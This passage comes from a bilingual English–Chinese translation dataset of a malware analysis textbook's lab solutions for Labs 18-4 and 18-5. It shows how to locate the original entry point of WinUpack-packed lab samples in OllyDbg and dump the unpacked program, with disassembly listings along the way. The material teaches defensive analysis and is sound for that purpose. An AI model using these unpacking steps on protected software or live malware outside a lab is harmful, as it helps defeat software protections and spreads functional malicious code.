- en: 004113BA PUSH Lab18-04.00403896
  id: totrans-6303
  prefs: []
  type: TYPE_NORMAL
  zh: 004113BA PUSH Lab18-04.00403896
- en: 004113BF RETN
  id: totrans-6304
  prefs: []
  type: TYPE_NORMAL
  zh: 004113BF RETN
- en: '*Listing 18-10L: Instructions after our stack breakpoint is triggered* We see
    a jnz instruction at , immediately after the popad instruction. We know that
    the popad should be followed closely by the tail jump, which transfers execution
    to the OEP. We step-over the jnz instruction and see that it jumps just a few
    instructions ahead. There we see a push followed by a retn, which transfers execution
    to the address pushed onto the stack and might be our tail jump.'
  id: totrans-6305
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表18-10L：触发我们的堆栈断点后的指令* 我们在处看到一个jnz指令，紧随`popad`指令之后。我们知道`popad`应该紧接着尾跳，将执行权转移到OEP。我们跳过jnz指令，看到它跳转了几条指令。在那里我们看到一个`push`后跟一个`retn`，这会将执行权转移到堆栈上推入的地址，可能是我们的尾跳。'
- en: When we step over the retn instruction, we see that our instruction pointer
    has been transferred to another area of the program. As in previous labs, OllyDbg
    may not have disassembled this code, as shown in Listing 18-11L.
  id: totrans-6306
  prefs: []
  type: TYPE_NORMAL
  zh: 当我们跳过`retn`指令时，我们看到我们的指令指针已经转移到程序的另一个区域。与之前的实验一样，OllyDbg可能没有反汇编这段代码，如列表18-11L所示。
- en: 00403896 DB 55 ; CHAR 'U'
  id: totrans-6307
  prefs: []
  type: TYPE_NORMAL
  zh: 00403896 DB 55 ; 字符 'U'
- en: 00403897 DB 8B
  id: totrans-6308
  prefs: []
  type: TYPE_NORMAL
  zh: 00403897 DB 8B
- en: 00403898 DB EC
  id: totrans-6309
  prefs: []
  type: TYPE_NORMAL
  zh: 00403898 DB EC
- en: '**690**'
  id: totrans-6310
  prefs: []
  type: TYPE_NORMAL
  zh: '**690**'
- en: Appendix C
  id: totrans-6311
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-6312
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 00403899 DB 6A ; CHAR 'j'
  id: totrans-6313
  prefs: []
  type: TYPE_NORMAL
  zh: 00403899 DB 6A ; 字符 'j'
- en: 0040389A DB FF
  id: totrans-6314
  prefs: []
  type: TYPE_NORMAL
  zh: 0040389A DB FF
- en: 0040389B DB 68 ; CHAR 'h'
  id: totrans-6315
  prefs: []
  type: TYPE_NORMAL
  zh: 0040389B DB 68 ; 字符 'h'
- en: 0040389C DB 88
  id: totrans-6316
  prefs: []
  type: TYPE_NORMAL
  zh: 0040389C DB 88
- en: 0040389D DB B1
  id: totrans-6317
  prefs: []
  type: TYPE_NORMAL
  zh: 0040389D DB B1
- en: 0040389E DB 40 ; CHAR '@'
  id: totrans-6318
  prefs: []
  type: TYPE_NORMAL
  zh: 0040389E DB 40 ; 字符 '@'
- en: 0040389F DB 00
  id: totrans-6319
  prefs: []
  type: TYPE_NORMAL
  zh: 0040389F DB 00
- en: '*Listing 18-11L: OEP of the code before OllyDbg has analyzed it* We know this
    is code, so we tell OllyDbg to disassemble it by right-clicking the first byte
    and selecting **Analysis****Analyze Code**. Now we see what looks like legitimate
    code with the telltale GetModuleHandleA function, as shown in Listing 18-12L.
    This confirms our suspicions that this is the OEP.'
  id: totrans-6320
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表18-11L：在OllyDbg分析之前的代码OEP* 我们知道这是代码，因此我们通过右键单击第一个字节并选择**分析****分析代码**来告诉OllyDbg反汇编它。现在我们看到看起来像是合法代码，带有明显的GetModuleHandleA函数，如列表18-12L所示。这证实了我们的怀疑，即这是OEP。'
- en: 00403896 PUSH EBP
  id: totrans-6321
  prefs: []
  type: TYPE_NORMAL
  zh: 00403896 PUSH EBP
- en: 00403897 MOV EBP,ESP
  id: totrans-6322
  prefs: []
  type: TYPE_NORMAL
  zh: 00403897 MOV EBP,ESP
- en: 00403899 PUSH -1
  id: totrans-6323
  prefs: []
  type: TYPE_NORMAL
  zh: 00403899 PUSH -1
- en: 0040389B PUSH Lab18-04.0040B188
  id: totrans-6324
  prefs: []
  type: TYPE_NORMAL
  zh: 0040389B PUSH Lab18-04.0040B188
- en: 004038A0 PUSH Lab18-04.004064AC ; SE handler installation 004038A5 MOV EAX,DWORD
    PTR FS:[0]
  id: totrans-6325
  prefs: []
  type: TYPE_NORMAL
  zh: 004038A0 PUSH Lab18-04.004064AC ; SE处理程序安装 004038A5 MOV EAX,DWORD PTR FS:[0]
- en: 004038AB PUSH EAX
  id: totrans-6326
  prefs: []
  type: TYPE_NORMAL
  zh: 004038AB PUSH EAX
- en: 004038AC MOV DWORD PTR FS:[0],ESP
  id: totrans-6327
  prefs: []
  type: TYPE_NORMAL
  zh: 004038AC MOV DWORD PTR FS:[0],ESP
- en: 004038B3 SUB ESP,10
  id: totrans-6328
  prefs: []
  type: TYPE_NORMAL
  zh: 004038B3 SUB ESP,10
- en: 004038B6 PUSH EBX
  id: totrans-6329
  prefs: []
  type: TYPE_NORMAL
  zh: 004038B6 PUSH EBX
- en: 004038B7 PUSH ESI
  id: totrans-6330
  prefs: []
  type: TYPE_NORMAL
  zh: 004038B7 PUSH ESI
- en: 004038B8 PUSH EDI
  id: totrans-6331
  prefs: []
  type: TYPE_NORMAL
  zh: 004038B8 PUSH EDI
- en: 004038B9 MOV DWORD PTR SS:[EBP-18],ESP
  id: totrans-6332
  prefs: []
  type: TYPE_NORMAL
  zh: 004038B9 MOV DWORD PTR SS:[EBP-18],ESP
- en: '004038BC CALL DWORD PTR DS:[40B0B8] ; kernel32.GetVersion *Listing 18-12L:
    OEP after OllyDbg has analyzed the code* Next, we select **Plugins****OllyDump****Dump
    Debugged Process**. We click the **Get EIP as OEP** button, accept the default
    settings, and click **Dump**. In the dialog, we enter a filename to save a copy
    of the unpacked program.'
  id: totrans-6333
  prefs: []
  type: TYPE_NORMAL
  zh: 004038BC CALL DWORD PTR DS:[40B0B8] ; kernel32.GetVersion *列表18-12L：OllyDbg分析后的代码OEP*
    接下来，我们选择**插件****OllyDump****转储调试进程**。我们点击**获取EIP作为OEP**按钮，接受默认设置，并点击**转储**。在对话框中，我们输入一个文件名以保存解包程序的副本。
- en: Having dumped the program, run it to verify that it works properly.
  id: totrans-6334
  prefs: []
  type: TYPE_NORMAL
  zh: 将程序导出后，运行它以验证其是否正常工作。
- en: Then open it in IDA Pro to verify that it is unpacked and has the same functionality
    as *Lab09-01.exe*.
  id: totrans-6335
  prefs: []
  type: TYPE_NORMAL
  zh: 然后在IDA Pro中打开它，以验证它是否已解包并且具有与*Lab09-01.exe*相同的函数。
- en: '**Lab 18-5 Solutions**'
  id: totrans-6336
  prefs: []
  type: TYPE_NORMAL
  zh: '**实验18-5 解答**'
- en: '**1 8**'
  id: totrans-6337
  prefs: []
  type: TYPE_NORMAL
  zh: '**1 8**'
- en: The program in the *Lab18-05.exe* file is *Lab07-01.exe* packed with WinUpack.
  id: totrans-6338
  prefs: []
  type: TYPE_NORMAL
  zh: '*Lab18-05.exe*文件中的程序是用WinUpack打包的*Lab07-01.exe*。'
- en: When we load this file into PEiD, it’s recognized as being packed with WinUpack
    0.39\. However, the file’s PE header is badly damaged. If we load it into OllyDbg,
    IDA Pro, or PEview, we get several errors that make it impossible to view information
    from the PE header.
  id: totrans-6339
  prefs: []
  type: TYPE_NORMAL
  zh: 当我们将这个文件加载到PEiD中时，它被识别为使用WinUpack 0.39打包。然而，文件的PE头损坏严重。如果我们将其加载到OllyDbg、IDA
    Pro或PEview中，我们会得到几个错误，使得无法从PE头中查看信息。
- en: We load the file into OllyDbg and see an error stating “Bad or unknown format
    of 32-bit executable file.” OllyDbg can load the file, but it can’t find the entry
    point for the unpacking stub and instead breaks at the system breakpoint, which
    occurs well before the unpacking stub.
  id: totrans-6340
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将文件加载到OllyDbg中，看到一个错误信息“32位可执行文件格式错误或未知。”OllyDbg可以加载文件，但它找不到解包占位符的入口点，而是在系统断点处中断，这个断点发生在解包占位符之前很久。
- en: Solutions to Labs
  id: totrans-6341
  prefs: []
  type: TYPE_NORMAL
  zh: 实验室解决方案
- en: '**691**'
  id: totrans-6342
  prefs: []
  type: TYPE_NORMAL
  zh: '**691**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-6343
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: Because we have not even reached the unpacking stub, most of our techniques
    will not work. We could step-into and step-over instructions carefully until we
    reach the unpacking stub, and then work from there, but that would be a long and
    frustrating process. Instead, we will set breakpoints on LoadLibrary and GetProcAddress
    in order to bypass the beginning of the unpacking stub.
  id: totrans-6344
  prefs: []
  type: TYPE_NORMAL
  zh: 因为我们甚至还没有达到解包占位符，我们的大部分技术将不会起作用。我们可以小心翼翼地单步进入和单步跳过指令，直到我们达到解包占位符，然后从那里开始工作，但这将是一个漫长且令人沮丧的过程。相反，我们将设置LoadLibrary和GetProcAddress的断点，以绕过解包占位符的开始部分。
- en: We know that loading imported libraries and resolving the imports with GetProcAddress
    are a couple of the last steps performed by the unpacking stub.
  id: totrans-6345
  prefs: []
  type: TYPE_NORMAL
  zh: 我们知道，加载导入的库和通过GetProcAddress解析导入是解包占位符执行的最后几个步骤之一。
- en: If we can set a breakpoint that is triggered on the last call to GetProcAddress,
    we’ll be very close to the tail jump, but there’s no way to know which call to
    GetProcAddress is last until after the call is executed. Instead, we set breakpoints
    on LoadLibrary and GetProcAddress, and use trial-and-error to figure out which
    call is last.
  id: totrans-6346
  prefs: []
  type: TYPE_NORMAL
  zh: 如果我们能在GetProcAddress的最后一次调用上设置一个断点，我们就会非常接近尾部跳转，但直到调用执行完毕，我们无法知道哪个GetProcAddress调用是最后的。相反，我们在LoadLibrary和GetProcAddress上设置断点，并通过试错法来确定哪个调用是最后的。
- en: We begin by setting a breakpoint on the first instruction of LoadLibrary by
    pressing CTRL-G and entering **LoadLibraryA** into the dialog. This should take
    us to the first instruction of LoadLibraryA, where we press F2 to set a breakpoint.
    We then repeat the process with LoadLibraryW so that we have a breakpoint on both
    versions of LoadLibrary, and then press F9 to start the program.
  id: totrans-6347
  prefs: []
  type: TYPE_NORMAL
  zh: 我们首先通过按CTRL-G并输入**LoadLibraryA**到对话框中来在LoadLibrary的第一条指令上设置断点。这应该带我们到LoadLibraryA的第一条指令，在那里我们按F2来设置断点。然后我们重复这个过程，用LoadLibraryW来设置断点，这样我们就有两个LoadLibrary版本的断点，然后按F9来启动程序。
- en: We’re using the fact that LoadLibrary is called as a way to bypass as much of
    the unpacking stub as possible because we want to keep running the program until
    the last call to LoadLibrary. Because we don’t know which call to LoadLibrary
    is the last one (until it’s too late), each time the breakpoint is hit, we continue
    running the program and note the library being loaded. If the library being loaded
    is not the last one, the program will stop very quickly once the next library
    is loaded. When the last library is loaded, the program should continue running,
    and that is how we know we have found the last call to LoadLibrary. When we set
    our breakpoint on LoadLibrary, we see that the first library loaded is *kernel32.dll*,
    followed by *advapi32.dll*, and so on.
  id: totrans-6348
  prefs: []
  type: TYPE_NORMAL
  zh: 我们利用LoadLibrary的调用作为绕过尽可能多的解包占位符的方法，因为我们希望程序一直运行到LoadLibrary的最后一次调用。因为我们不知道哪个LoadLibrary调用是最后的（直到太晚），每次断点被触发时，我们继续运行程序并记录正在加载的库。如果正在加载的库不是最后的，一旦加载下一个库，程序将很快停止。当加载最后的库时，程序应该继续运行，这就是我们知道我们已经找到了LoadLibrary的最后一次调用。当我们设置LoadLibrary的断点时，我们看到第一个加载的库是*kernel32.dll*，然后是*advapi32.dll*，依此类推。
- en: The fifth and sixth calls to LoadLibrary load *commctrl.dll*. After the sixth
    call, we continue running the program, and it does not stop. The sixth call is
    the final one.
  id: totrans-6349
  prefs: []
  type: TYPE_NORMAL
  zh: 第五次和第六次LoadLibrary调用加载*commctrl.dll*。在第六次调用之后，我们继续运行程序，它没有停止。第六次调用是最后的。
- en: Now we restart our program. We reset our breakpoint on LoadLibrary, and then
    run the program until the breakpoint is hit a sixth time and the parameter is
    commctrl. Next, we set a breakpoint on GetProcAddress and perform the same procedure
    to determine which API function is the last to be resolved with GetProcAddress.
  id: totrans-6350
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们重新启动我们的程序。我们在 LoadLibrary 上重置断点，然后运行程序，直到断点被触发第六次，参数是 commctrl。接下来，我们在 GetProcAddress
    上设置断点，并执行相同的程序来确定哪个 API 函数是最后一个通过 GetProcAddress 解析的。
- en: We run the program several times to find out which function is loaded last.
    After a call to GetProcAddress with the value InternetOpenA, we see that the program
    continues to run without hitting our breakpoint again. Now we restart our program
    once again. We reset our breakpoints on LoadLibraryA and LoadLibraryW, and run
    the program until the final call to LoadLibrary.
  id: totrans-6351
  prefs: []
  type: TYPE_NORMAL
  zh: 我们运行程序几次，以找出哪个函数是最后加载的。在调用 GetProcAddress 并传入值 InternetOpenA 后，我们看到程序继续运行，没有再次触发我们的断点。现在我们再次重新启动程序。我们在
    LoadLibraryA 和 LoadLibraryW 上重置断点，并运行程序，直到 LoadLibrary 的最终调用。
- en: Then we run the program until the final call to GetProcAddress.
  id: totrans-6352
  prefs: []
  type: TYPE_NORMAL
  zh: 然后我们运行程序，直到 GetProcAddress 的最终调用。
- en: Resolving the imports is nearly the last step in the unpacking stub. The only
    task remaining after resolving the imports is the transfer of control to the OEP.
    The unpacking stub is nearly finished, and we can step through the code to find
    the OEP.
  id: totrans-6353
  prefs: []
  type: TYPE_NORMAL
  zh: 解析导入几乎是解包占位符的最后一步。解析导入之后剩下的唯一任务是控制权转移到 OEP。解包占位符几乎完成，我们可以单步执行代码以找到 OEP。
- en: '**692**'
  id: totrans-6354
  prefs: []
  type: TYPE_NORMAL
  zh: '**692**'
- en: Appendix C
  id: totrans-6355
  prefs: []
  type: TYPE_NORMAL
  zh: 附录 C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-6356
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 'We step through the rest of the GetProcAddress until the ret instruction brings
    us back to the unpacking stub, and then we continue to step through the code until
    we see what looks like the tail jump. The next control transfer instruction is
    shown here:'
  id: totrans-6357
  prefs: []
  type: TYPE_NORMAL
  zh: 我们继续单步执行 GetProcAddress，直到 ret 指令将我们带回到解包占位符，然后我们继续单步执行代码，直到我们看到类似尾部跳转的代码。下一个控制转移指令如下所示：
- en: 00408EB4 STOS DWORD PTR ES:[EDI]
  id: totrans-6358
  prefs: []
  type: TYPE_NORMAL
  zh: 00408EB4 STOS DWORD PTR ES:[EDI]
- en: 00408EB5 JMP SHORT Lab07_01.00408E9E
  id: totrans-6359
  prefs: []
  type: TYPE_NORMAL
  zh: 00408EB5 JMP SHORT Lab07_01.00408E9E
- en: This is not the tail jump because it’s relatively short and goes to the following
    code, which doesn’t look like the start of a program.
  id: totrans-6360
  prefs: []
  type: TYPE_NORMAL
  zh: 这也不是一个尾部跳转，因为它相对较短，并且跳转到以下代码，这些代码看起来不像程序的开始。
- en: 00408E9E LODS BYTE PTR DS:[ESI]
  id: totrans-6361
  prefs: []
  type: TYPE_NORMAL
  zh: 00408E9E LODS BYTE PTR DS:[ESI]
- en: 00408E9F TEST AL,AL
  id: totrans-6362
  prefs: []
  type: TYPE_NORMAL
  zh: 00408E9F TEST AL,AL
- en: 00408EA1 JNZ SHORT Lab07_01.00408E9E
  id: totrans-6363
  prefs: []
  type: TYPE_NORMAL
  zh: 00408EA1 JNZ SHORT Lab07_01.00408E9E
- en: 'These instructions form a short loop, and we step through this code until the
    loop is finished. When the loop is complete, the code falls through to these instructions:'
  id: totrans-6364
  prefs: []
  type: TYPE_NORMAL
  zh: 这些指令形成了一个短循环，我们单步执行这段代码，直到循环结束。当循环完成后，代码会跳转到以下指令：
- en: 00408EA3 CMP BYTE PTR DS:[ESI],AL
  id: totrans-6365
  prefs: []
  type: TYPE_NORMAL
  zh: 00408EA3 CMP BYTE PTR DS:[ESI],AL
- en: 00408EA5 JE SHORT Lab07_01.00408E91
  id: totrans-6366
  prefs: []
  type: TYPE_NORMAL
  zh: 00408EA5 JE SHORT Lab07_01.00408E91
- en: This is also not the tail jump because it is relatively short and the code at
    the target doesn’t look like the start of a program.
  id: totrans-6367
  prefs: []
  type: TYPE_NORMAL
  zh: 这也不是一个尾部跳转，因为它相对较短，并且目标代码看起来不像程序的开始。
- en: 00408E91 POP ECX
  id: totrans-6368
  prefs: []
  type: TYPE_NORMAL
  zh: 00408E91 POP ECX
- en: 00408E92 INC ESI
  id: totrans-6369
  prefs: []
  type: TYPE_NORMAL
  zh: 00408E92 INC ESI
- en: 00408E93 LODS DWORD PTR DS:[ESI]
  id: totrans-6370
  prefs: []
  type: TYPE_NORMAL
  zh: 00408E93 LODS DWORD PTR DS:[ESI]
- en: 00408E94 TEST EAX,EAX
  id: totrans-6371
  prefs: []
  type: TYPE_NORMAL
  zh: 00408E94 TEST EAX,EAX
- en: 00408E96 JE SHORT Lab07_01.00408EB7
  id: totrans-6372
  prefs: []
  type: TYPE_NORMAL
  zh: 00408E96 JE SHORT Lab07_01.00408EB7
- en: The jump at this next block of code goes to a retn instruction. A normal program
    would never start with a retn instruction, so we also know that isn’t the tail
    jump.
  id: totrans-6373
  prefs: []
  type: TYPE_NORMAL
  zh: 在下一块代码中的跳转会跳转到 retn 指令。一个正常的程序永远不会以 retn 指令开始，所以我们也知道那不是尾部跳转。
- en: 00408EB7 C3 RETN
  id: totrans-6374
  prefs: []
  type: TYPE_NORMAL
  zh: 00408EB7 C3 RETN
- en: When we step-over the retn instruction, we see the code shown in Listing 18-13L.
  id: totrans-6375
  prefs: []
  type: TYPE_NORMAL
  zh: 当我们跳过 retn 指令时，我们看到列表 18-13L 中所示的代码。
- en: '**1 8**'
  id: totrans-6376
  prefs: []
  type: TYPE_NORMAL
  zh: '**1 8**'
- en: 00401190 PUSH EBP
  id: totrans-6377
  prefs: []
  type: TYPE_NORMAL
  zh: 00401190 PUSH EBP
- en: 00401191 MOV EBP,ESP
  id: totrans-6378
  prefs: []
  type: TYPE_NORMAL
  zh: 00401191 MOV EBP,ESP
- en: 00401193 PUSH -1
  id: totrans-6379
  prefs: []
  type: TYPE_NORMAL
  zh: 00401193 PUSH -1
- en: 00401195 PUSH Lab07_01.004040D0
  id: totrans-6380
  prefs: []
  type: TYPE_NORMAL
  zh: 00401195 PUSH Lab07_01.004040D0
- en: 0040119A PUSH Lab07_01.00401C58
  id: totrans-6381
  prefs: []
  type: TYPE_NORMAL
  zh: 0040119A PUSH Lab07_01.00401C58
- en: 0040119F MOV EAX,DWORD PTR FS:[0]
  id: totrans-6382
  prefs: []
  type: TYPE_NORMAL
  zh: 0040119F MOV EAX,DWORD PTR FS:[0]
- en: 004011A5 PUSH EAX
  id: totrans-6383
  prefs: []
  type: TYPE_NORMAL
  zh: 004011A5 PUSH EAX
- en: 004011A6 MOV DWORD PTR FS:[0],ESP
  id: totrans-6384
  prefs: []
  type: TYPE_NORMAL
  zh: 004011A6 MOV DWORD PTR FS:[0],ESP
- en: Solutions to Labs
  id: totrans-6385
  prefs: []
  type: TYPE_NORMAL
  zh: 实验解决方案
- en: '**693**'
  id: totrans-6386
  prefs: []
  type: TYPE_NORMAL
  zh: '**693**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-6387
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 004011AD SUB ESP,10
  id: totrans-6388
  prefs: []
  type: TYPE_NORMAL
  zh: 004011AD SUB ESP,10
- en: 004011B0 PUSH EBX
  id: totrans-6389
  prefs: []
  type: TYPE_NORMAL
  zh: 004011B0 PUSH EBX
- en: 004011B1 PUSH ESI
  id: totrans-6390
  prefs: []
  type: TYPE_NORMAL
  zh: 004011B1 PUSH ESI
- en: 004011B2 PUSH EDI
  id: totrans-6391
  prefs: []
  type: TYPE_NORMAL
  zh: 004011B2 PUSH EDI
- en: 004011B3 MOV DWORD PTR SS:[EBP-18],ESP
  id: totrans-6392
  prefs: []
  type: TYPE_NORMAL
  zh: 004011B3 MOV DWORD PTR SS:[EBP-18],ESP
- en: 004011B6 CALL DWORD PTR DS:[40404C]
  id: totrans-6393
  prefs: []
  type: TYPE_NORMAL
  zh: 004011B6 CALL DWORD PTR DS:[40404C]
- en: ; kernel32.GetVersion
  id: totrans-6394
  prefs: []
  type: TYPE_NORMAL
  zh: ; kernel32.GetVersion
- en: 004011BC XOR EDX,EDX
  id: totrans-6395
  prefs: []
  type: TYPE_NORMAL
  zh: 004011BC XOR EDX,EDX
- en: 004011BE MOV DL,AH
  id: totrans-6396
  prefs: []
  type: TYPE_NORMAL
  zh: 004011BE MOV DL,AH
- en: 004011C0 MOV DWORD PTR DS:[405304],EDX
  id: totrans-6397
  prefs: []
  type: TYPE_NORMAL
  zh: 004011C0 MOV DWORD PTR DS:[405304],EDX
- en: 004011C6 MOV ECX,EAX
  id: totrans-6398
  prefs: []
  type: TYPE_NORMAL
  zh: 004011C6 MOV ECX,EAX
- en: 004011C8 AND ECX,0FF
  id: totrans-6399
  prefs: []
  type: TYPE_NORMAL
  zh: 004011C8 AND ECX,0FF
- en: 004011CE MOV DWORD PTR DS:[405300],ECX
  id: totrans-6400
  prefs: []
  type: TYPE_NORMAL
  zh: 004011CE MOV DWORD PTR DS:[405300],ECX
- en: 004011D4 SHL ECX,8
  id: totrans-6401
  prefs: []
  type: TYPE_NORMAL
  zh: 004011D4 SHL ECX,8
- en: 004011D7 ADD ECX,EDX
  id: totrans-6402
  prefs: []
  type: TYPE_NORMAL
  zh: 004011D7 ADD ECX,EDX
- en: 004011D9 MOV DWORD PTR DS:[4052FC],ECX
  id: totrans-6403
  prefs: []
  type: TYPE_NORMAL
  zh: 004011D9 MOV DWORD PTR DS:[4052FC],ECX
- en: 004011DF SHR EAX,10
  id: totrans-6404
  prefs: []
  type: TYPE_NORMAL
  zh: 004011DF SHR EAX,10
- en: 004011E2 MOV DWORD PTR DS:[4052F8],EAX
  id: totrans-6405
  prefs: []
  type: TYPE_NORMAL
  zh: 004011E2 MOV DWORD PTR DS:[4052F8],EAX
- en: 004011E7 PUSH 0
  id: totrans-6406
  prefs: []
  type: TYPE_NORMAL
  zh: 004011E7 PUSH 0
- en: 004011E9 CALL Lab07_01.00401B21
  id: totrans-6407
  prefs: []
  type: TYPE_NORMAL
  zh: 004011E9 CALL Lab07_01.00401B21
- en: 004011EE POP ECX
  id: totrans-6408
  prefs: []
  type: TYPE_NORMAL
  zh: 004011EE POP ECX
- en: 004011EF TEST EAX,EAX
  id: totrans-6409
  prefs: []
  type: TYPE_NORMAL
  zh: 004011EF TEST EAX,EAX
- en: 004011F1 JNZ SHORT Lab07_01.004011FB
  id: totrans-6410
  prefs: []
  type: TYPE_NORMAL
  zh: 004011F1 JNZ SHORT Lab07_01.004011FB
- en: 004011F3 PUSH 1C
  id: totrans-6411
  prefs: []
  type: TYPE_NORMAL
  zh: 004011F3 PUSH 1C
- en: 004011F5 CALL Lab07_01.00401294
  id: totrans-6412
  prefs: []
  type: TYPE_NORMAL
  zh: 004011F5 CALL Lab07_01.00401294
- en: 004011FA POP ECX
  id: totrans-6413
  prefs: []
  type: TYPE_NORMAL
  zh: 004011FA POP ECX
- en: 004011FB AND DWORD PTR SS:[EBP-4],0
  id: totrans-6414
  prefs: []
  type: TYPE_NORMAL
  zh: 004011FB AND DWORD PTR SS:[EBP-4],0
- en: 004011FF CALL Lab07_01.00401976
  id: totrans-6415
  prefs: []
  type: TYPE_NORMAL
  zh: 004011FF CALL Lab07_01.00401976
- en: 00401204 CALL DWORD PTR DS:[404048]
  id: totrans-6416
  prefs: []
  type: TYPE_NORMAL
  zh: 00401204 CALL DWORD PTR DS:[404048]
- en: ; kernel32.GetCommandLineA
  id: totrans-6417
  prefs: []
  type: TYPE_NORMAL
  zh: ; kernel32.GetCommandLineA
- en: 0040120A MOV DWORD PTR DS:[4057F8],EAX
  id: totrans-6418
  prefs: []
  type: TYPE_NORMAL
  zh: 0040120A MOV DWORD PTR DS:[4057F8],EAX
- en: 0040120F CALL Lab07_01.00401844
  id: totrans-6419
  prefs: []
  type: TYPE_NORMAL
  zh: 0040120F CALL Lab07_01.00401844
- en: 00401214 MOV DWORD PTR DS:[4052E0],EAX
  id: totrans-6420
  prefs: []
  type: TYPE_NORMAL
  zh: 00401214 MOV DWORD PTR DS:[4052E0],EAX
- en: 00401219 CALL Lab07_01.004015F7
  id: totrans-6421
  prefs: []
  type: TYPE_NORMAL
  zh: 00401219 CALL Lab07_01.004015F7
- en: '*Listing 18-13L: The OEP for* Lab18-05.exe'
  id: totrans-6422
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表18-13L：Lab18-05.exe的OEP*'
- en: 'This looks like the OEP for several reasons:'
  id: totrans-6423
  prefs: []
  type: TYPE_NORMAL
  zh: 这看起来像是OEP，有以下几个原因：
- en: 1\.
  id: totrans-6424
  prefs: []
  type: TYPE_NORMAL
  zh: 1\.
- en: It’s a relatively far jump.
  id: totrans-6425
  prefs: []
  type: TYPE_NORMAL
  zh: 这是一个相对较远的跳转。
- en: 2\.
  id: totrans-6426
  prefs: []
  type: TYPE_NORMAL
  zh: 2\.
- en: The code starts with a push ebp at , which indicates the beginning of a function.
  id: totrans-6427
  prefs: []
  type: TYPE_NORMAL
  zh: 代码以处的push ebp开始，这表明函数的开始。
- en: 3\.
  id: totrans-6428
  prefs: []
  type: TYPE_NORMAL
  zh: 3\.
- en: The code in this function calls GetVersion at  and GetCommandLineA at , which
    are commonly called at the very beginning of a program.
  id: totrans-6429
  prefs: []
  type: TYPE_NORMAL
  zh: 这个函数中的代码在处调用GetVersion，在处调用GetCommandLineA，这两个函数通常在程序开始时被调用。
- en: Having identified the OEP, we use **Plugins****OllyDump****Dump** **Debugged
    Process** to dump the unpacked program. Next, we load the program into IDA Pro,
    but, unfortunately, we get some errors. Apparently, the program’s file headers
    are not fully repaired. However, IDA Pro has labeled the main function anyway,
    so we can analyze the program even though the PE file isn’t fully reconstructed.
  id: totrans-6430
  prefs: []
  type: TYPE_NORMAL
  zh: 确定了OEP后，我们使用**插件****OllyDump****转储** **调试进程**来转储未打包的程序。接下来，我们将程序加载到IDA Pro中，但不幸的是，我们遇到了一些错误。显然，程序的文件头并没有完全修复。然而，IDA
    Pro仍然标记了主函数，因此即使PE文件没有完全重建，我们也可以分析程序。
- en: '**694**'
  id: totrans-6431
  prefs: []
  type: TYPE_NORMAL
  zh: '**694**'
- en: Appendix C
  id: totrans-6432
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-6433
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: The biggest roadblock is that we don’t have any import information.
  id: totrans-6434
  prefs: []
  type: TYPE_NORMAL
  zh: 最大的障碍是我们没有任何导入信息。
- en: However, we can easily spot the calls to imported functions by looking for calls
    to data locations. For example, let’s look at the main method, as shown in Listing
    18-14L.
  id: totrans-6435
  prefs: []
  type: TYPE_NORMAL
  zh: 然而，我们可以通过查找对数据位置的调用轻松地找到对导入函数的调用。例如，让我们看看主方法，如列表18-14L所示。
- en: 00401000 sub esp, 10h
  id: totrans-6436
  prefs: []
  type: TYPE_NORMAL
  zh: 00401000 sub esp, 10h
- en: 00401003 lea eax, [esp+10h+var_10]
  id: totrans-6437
  prefs: []
  type: TYPE_NORMAL
  zh: 00401003 lea eax, [esp+10h+var_10]
- en: 00401007 mov [esp+10h+var_10], offset aMalservice ; "MalService"
  id: totrans-6438
  prefs: []
  type: TYPE_NORMAL
  zh: 00401007 mov [esp+10h+var_10], offset aMalservice ; "MalService"
- en: 0040100F push eax
  id: totrans-6439
  prefs: []
  type: TYPE_NORMAL
  zh: 0040100F push eax
- en: 00401010 mov [esp+14h+var_C], offset sub_401040
  id: totrans-6440
  prefs: []
  type: TYPE_NORMAL
  zh: 00401010 mov [esp+14h+var_C], offset sub_401040
- en: 00401018 mov [esp+14h+var_8], 0
  id: totrans-6441
  prefs: []
  type: TYPE_NORMAL
  zh: 00401018 mov [esp+14h+var_8], 0
- en: 00401020 mov [esp+14h+var_4], 0
  id: totrans-6442
  prefs: []
  type: TYPE_NORMAL
  zh: 00401020 mov [esp+14h+var_4], 0
- en: 00401028 call dword_404004
  id: totrans-6443
  prefs: []
  type: TYPE_NORMAL
  zh: 00401028 call dword_404004
- en: 0040102E push 0
  id: totrans-6444
  prefs: []
  type: TYPE_NORMAL
  zh: 0040102E push 0
- en: 00401030 push 0
  id: totrans-6445
  prefs: []
  type: TYPE_NORMAL
  zh: 00401030 push 0
- en: 00401032 call sub_401040
  id: totrans-6446
  prefs: []
  type: TYPE_NORMAL
  zh: 00401032 call sub_401040
- en: 00401037 add esp, 18h
  id: totrans-6447
  prefs: []
  type: TYPE_NORMAL
  zh: 00401037 add esp, 18h
- en: 0040103A retn
  id: totrans-6448
  prefs: []
  type: TYPE_NORMAL
  zh: 0040103A retn
- en: '*Listing 18-14L: The main method for unpacked* Lab18-05.exe The call at  jumps
    out as a call to an imported function. You can click the DWORD to view the address
    of the imported functions for this program, as shown in Listing 18-15L.'
  id: totrans-6449
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表18-14L：未打包Lab18-05.exe的主方法* 调用处的跳转被识别为对导入函数的调用。您可以点击DWORD来查看该程序导入函数的地址，如列表18-15L所示。'
- en: 00404000 dword_404000 dd 77E371E9h
